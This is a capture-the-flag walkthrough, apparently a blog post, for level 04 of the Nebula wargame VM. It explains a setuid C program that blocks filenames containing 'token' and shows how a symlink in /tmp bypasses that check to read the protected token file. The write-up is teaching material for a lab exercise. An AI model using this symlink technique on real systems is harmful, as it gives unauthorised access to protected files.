title: "Nebula Series - Level 04"
---

*Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file
system race conditions.*

**Level 04** teaches us some misdirection

<!--more-->

Depending on filenames to prevent unauthorized access is a terrible idea.

Our goal for this level is to obtain the value stored in the `/home/flag04/token` file. We're provided with the following
source code for the executable at `/home/flag04/flag04`:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

It first checks that more than one argument is supplied.

```c
  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }
```

The reason it's testing `argc == 1` is because the first argument
is always the name of the executable itself.

Next it checks if the supplied filename contains the substring "token" using `strstr` from the C stdlib.

```c
  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }
```

If the substring is found, the app exits after informing the user that they are not allowed to access that file.

We'll want to avoid this.

Next it opens and reads the file into the buffer

```c
  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }
```

And finally, it writes the contents to stdout.

```c
  write(1, buf, rc);
```

The first argument here is a file descriptor; in this case it's file descriptor 1 - aka STDOUT.

Alright so how do we sirsumvent the security checks?

Enter symbolic links.

A symbolic link is essentially a named pointer to another file. We can create a symbolic link that doesn't contain "token" in
its name and point it at the token file like

```bash
level04@nebula:~$ ln -s /home/flag04/token /tmp/trickedya

level04@nebula:~$ ls -l /tmp
total 0
lrwxrwxrwx 1 level04 level04 18 2020-04-10 09:00 trickedya -> /home/flag04/token
```

Now all that's left is to run the app again but hand it the symlink

```bash
level04@nebula:~$ /home/flag04/flag04 /tmp/trickedya
06508b5e-8909-4f38-b630-fdb148a848a2
```

And there it is -- the token we weren't supposed to see!

In summary:

- Don't hand-roll your own security
